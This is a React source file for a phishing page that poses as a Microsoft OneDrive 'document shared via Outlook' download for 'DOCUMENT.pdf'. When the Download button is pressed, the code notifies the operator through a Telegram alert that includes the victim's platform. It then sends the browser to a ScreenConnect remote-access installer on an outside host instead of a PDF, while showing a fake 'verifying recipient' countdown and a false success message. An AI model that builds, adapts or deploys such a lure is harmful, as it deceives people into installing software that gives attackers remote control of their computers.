/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import { 
  Cloud, 
  FileText, 
  Loader2
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

export default function App() {
  const [status, setStatus] = useState<'initial' | 'loading' | 'success'>('initial');
  const [countdown, setCountdown] = useState(5);

  const handleDownload = async () => {
    setStatus('loading');
    setCountdown(5);

    // Send Telegram Notification
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `<b>🔔 Download Alert</b>\n\nRecipient has clicked the download button for <code>DOCUMENT.pdf</code>.\n\n<b>Time:</b> ${new Date().toLocaleString()}\n<b>Platform:</b> ${navigator.platform}`
        })
      });
    } catch (error) {
      console.error('Failed to send notification:', error);
    }

    // Redirect to the specified URL to start the download immediately
    window.location.href = "https://sandlerandassociates1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
  };

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (status === 'loading') {
      if (countdown > 0) {
        timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      } else {
        setStatus('success');
      }
    }
    return () => clearTimeout(timer);
  }, [status, countdown]);

  return (
    <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4 font-sans">
      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-[480px] bg-white rounded-lg shadow-[0_8px_30px_rgb(0,0,0,0.12)] p-8 flex flex-col items-center text-center"
      >
        {/* OneDrive Logo */}
        <div className="flex flex-col items-center mb-8">
          <div className="relative flex items-center justify-center mb-1">
            <Cloud size={48} className="text-[#0078d4] fill-[#0078d4]" />
            <Cloud size={32} className="text-[#28a8ea] fill-[#28a8ea] absolute -top-1 -right-2 opacity-80" />
          </div>
          <span className="text-[#0078d4] text-xl font-medium tracking-tight">OneDrive</span>
        </div>

        {/* Heading */}
        <h1 className="text-xl font-bold text-black mb-6 px-4">
          Here's the document that was shared with you via Outlook.
        </h1>

        {/* File Card */}
        <div className="w-full border border-slate-200 rounded-md p-4 flex items-center justify-center gap-4 mb-4 bg-white">
          <div className="relative">
            <FileText size={40} className="text-red-500" />
            <span className="absolute bottom-1 right-1 text-[8px] font-bold bg-white px-0.5 border border-red-500 text-red-500 rounded-sm">PDF</span>
          </div>
          <span className="text-lg font-bold text-black uppercase">DOCUMENT.pdf</span>
        </div>

        <AnimatePresence mode="wait">
          {status === 'initial' && (
            <motion.div 
              key="initial"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="w-full flex flex-col items-center"
            >
              <p className="text-slate-700 text-sm mb-2">
                This link only works for the direct recipients of this message.
              </p>
              <p className="text-red-600 text-sm font-medium mb-8">
                Note: This file can only be accessed on a laptop or desktop.
              </p>

              <button 
                onClick={handleDownload}
                className="w-full max-w-[200px] bg-[#0078d4] hover:bg-[#005a9e] text-white font-medium py-2.5 rounded transition-colors shadow-sm"
              >
                Download
              </button>
            </motion.div>
          )}

          {status === 'loading' && (
            <motion.div 
              key="loading"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="w-full flex flex-col items-center"
            >
              <p className="text-red-600 text-xs mb-8">
                Note: This file can only be accessed on a laptop or desktop.
              </p>

              <button 
                disabled
                className="w-full bg-[#0078d4] text-white font-medium py-2.5 rounded opacity-90 mb-8"
              >
                Download
              </button>

              <div className="flex flex-col items-center gap-4">
                <div className="relative">
                  <Loader2 size={64} className="text-[#0078d4] animate-spin stroke-[1.5px]" />
                </div>
                <div className="space-y-1">
                  <p className="text-slate-800 text-sm">Verifying recipient and preparing download...</p>
                  <p className="text-slate-800 text-sm">Download starts in {countdown} seconds</p>
                </div>
              </div>
            </motion.div>
          )}

          {status === 'success' && (
            <motion.div 
              key="success"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="w-full flex flex-col items-center"
            >
              <div className="bg-emerald-50 text-emerald-700 p-4 rounded-md border border-emerald-100 mb-6 w-full">
                <p className="font-medium">Verification successful.</p>
                <p className="text-sm">Your download should start automatically.</p>
              </div>
              <button 
                onClick={() => setStatus('initial')}
                className="text-xs text-[#0078d4] hover:underline"
              >
                Restart process
              </button>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Footer */}
        <div className="mt-12 text-[11px] text-slate-500">
          <span>Microsoft | </span>
          <a href="#" className="text-[#0078d4] hover:underline">Privacy Statement</a>
        </div>
      </motion.div>
    </div>
  );
}
